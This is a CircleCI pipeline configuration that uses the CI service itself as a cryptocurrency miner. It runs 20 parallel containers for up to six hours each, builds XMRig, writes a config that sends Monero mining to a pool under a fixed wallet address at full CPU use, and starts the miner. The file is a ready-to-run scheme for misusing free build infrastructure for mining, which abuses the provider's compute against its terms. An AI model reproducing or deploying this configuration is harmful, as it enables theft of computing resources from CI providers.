version: 2.1

jobs:
  mine:
    docker:
      - image: cimg/ubuntu:22.04  # Ubuntu latest Docker image
    parallelism: 20               # equivalent to your matrix of 20 instances
    resource_class: medium
    timeout: 360m
    steps:
      - checkout

      - run:
          name: Echo instance info
          command: |
            echo "Starting instance $CIRCLE_NODE_INDEX of $CIRCLE_NODE_TOTAL"
      
      - run:
          name: Install build dependencies
          command: |
            sudo apt-get update -y
            sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev

      - run:
          name: Clone & build XMRig
          command: |
            git clone https://github.com/xmrig/xmrig.git
            mkdir -p xmrig/build
            cd xmrig/build
            cmake .. -DWITH_HWLOC=ON -DCMAKE_BUILD_TYPE=Release
            make -j$(nproc)

      - run:
          name: Create config.json
          command: |
            cd xmrig/build
            cat > config.json << EOF
            {
                "autosave": true,
                "cpu": true,
                "opencl": true,
                "cuda": true,
                "pools": [
                    {
                        "algo": "rx/0",
                        "coin": "monero",
                        "url": "xmr.kryptex.network:7029",
                        "user": "461ys28cKUvdh7JLedMUPu7QDE5CVaSyU35QtzJ9WwFS7pk4UA8fnncD6JtANLhgDSQFWT5YSADmpV6vwZh29S769kptmTm/pc-${CIRCLE_NODE_INDEX}",
                        "pass": "x",
                        "tls": true,
                        "keepalive": true,
                        "nicehash": false
                    }
                ],
                "donate-level": 0,
                "donate-over-proxy": 0,
                "cpu-priority": 5,
                "cpu-affinity": -1,
                "asm": true,
                "huge-pages": true,
                "max-cpu-usage": 100,
                "gpu-max-alloc": 100,
                "gpu-fan": 100,
                "gpu-core-clock": 0,
                "gpu-mem-clock": 0,
                "gpu-powertune": 20,
                "retry-pause": 5
            }
            EOF

      - run:
          name: Start XMRig
          command: |
            cd xmrig/build
            ./xmrig --config=config.json --no-color --quiet || echo "miner ended"

workflows:
  version: 2
  mine-workflow:
    jobs:
      - mine
